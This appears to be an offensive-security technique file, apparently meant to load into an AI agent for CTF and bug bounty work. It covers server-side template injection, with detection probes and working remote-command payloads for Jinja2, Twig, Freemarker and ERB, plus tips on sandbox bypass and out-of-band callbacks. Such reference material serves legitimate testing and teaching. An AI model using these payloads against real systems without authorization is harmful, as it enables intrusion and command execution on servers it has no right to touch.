---
name: web-ssti
description: >
  Server-Side Template Injection → RCE. Load when user input is rendered by a template
  engine: profile names in emails, custom reports, "hello {{name}}", error pages echoing
  math, Jinja2/Twig/Freemarker/Velocity/ERB/Handlebars. Signals: {{7*7}} returns 49, ${...}
  or #{...} evaluated, framework stack traces mentioning a templating engine.
domain: web
type: technique
stability: learning
modes: [ctf, bugbounty]
severity: critical
owasp: [A03:2021-Injection]
cwe: [CWE-1336, CWE-94]
tools: [tplmap, burp]
schema_version: 1
---

# Server-Side Template Injection (SSTI)

## When it applies
Input flows into a server-side template that is *evaluated*, not just interpolated as text.
Common in email/notification templates, custom dashboards, and any "use variables in your
message" feature.

## Why it works
Template engines execute expressions. If attacker input becomes part of the template source
(rather than a bound variable), the engine evaluates it — and most engines expose object
introspection that reaches OS command execution.

## Method
1. **Detect** with a polyglot and engine-specific probes:
   `${7*7}` `{{7*7}}` `<%= 7*7 %>` `#{7*7}` `{7*7}` — a rendered `49` (not literal text) confirms.
2. **Identify the engine** by which syntax evaluated and by error messages, then branch:
   - **Jinja2 (Python)**: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
   - **Twig (PHP)**: `{{ ['id']|filter('system') }}` or `_self.env.registerUndefinedFilterCallback`.
   - **Freemarker (Java)**: `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}`.
   - **ERB (Ruby)**: `<%= \`id\` %>`.
3. **Automate/confirm** with `tplmap -u <url>` once you know it's injectable, but understand the
   payload — WAFs and sandboxes need manual gadget-chaining.

## Gotchas
- `{{7*7}}` → `49` is SSTI; `{{7*'7'}}` behaviour distinguishes Jinja (`7777777`) from Twig (`49`).
- Sandboxed engines (Twig sandbox, Jinja SandboxedEnvironment) block direct globals — hunt for a bypass gadget.
- XSS ≠ SSTI: `<svg>` rendering is client-side; only server-side *evaluation* of expressions is SSTI.

## Verify success
Command output (`uid=...` from `id`) reflected in the response, or an OOB callback from
`curl`/`nslookup` run through the payload.

## References
PortSwigger SSTI labs; James Kettle "Server-Side Template Injection".
